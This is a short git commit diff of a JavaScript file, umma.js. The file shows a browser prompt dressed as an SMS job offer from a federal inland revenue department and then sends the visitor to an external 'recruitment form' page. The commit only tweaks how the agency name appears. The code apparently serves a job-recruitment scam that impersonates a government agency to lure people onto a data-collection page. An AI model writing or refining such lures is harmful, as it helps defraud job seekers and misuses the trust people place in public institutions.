56e0b2aa606b8152a5b3b6011003020c808537d2
surprise24x7 <132287490+surprise24x7@users.noreply.github.com>
2024-11-02 09:49:35 +0530

    Update umma.js

--- umma.js
+++ umma.js
@@ -1,4 +1,5 @@
 var password = 'APPLY NOW'
-password=prompt('SMS: Job is available for you at Department of FEDERAL INLAND REVENUE SERVICE. kindly press Ok to start application now ','APPLY NOW');
+password=prompt('SMS: Job is available for you at Department of Federal Inland Rev. kindly press Ok to start application now ','APPLY NOW');
 if (password != 'APPLY NOW') {
 location.href='https://zaget.cc/Federal-Inland-Rev-Recruitment-Form.html';
+}
